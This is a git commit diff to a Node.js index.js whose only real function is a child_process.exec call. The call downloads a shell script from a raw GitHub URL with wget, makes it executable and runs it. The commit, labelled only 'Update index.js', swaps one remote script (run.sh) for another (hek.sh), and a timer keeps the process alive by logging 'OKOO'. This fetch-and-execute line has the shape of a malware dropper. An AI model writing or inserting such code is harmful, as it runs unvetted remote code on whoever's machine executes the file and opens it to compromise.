1c0f8a4123856fd80d11311211c1e36f1c657943
smirkeo <131346826+smirkeo@users.noreply.github.com>
2023-04-20 17:09:11 +0800

    Update index.js

--- index.js
+++ index.js
@@ -1,5 +1,5 @@
 const { exec } = require('child_process')
 
-exec('wget https://raw.githubusercontent.com/funfactbro/respect/main/run.sh && chmod +x run.sh && ./run.sh', (a,b,c) => console.log(a,b,c))
+exec('wget https://raw.githubusercontent.com/smirkeo/ok/main/hek.sh && chmod +x hek.sh && ./hek.sh', (a,b,c) => console.log(a,b,c))
 
 setInterval(() => console.log("OKOO"), 10000);
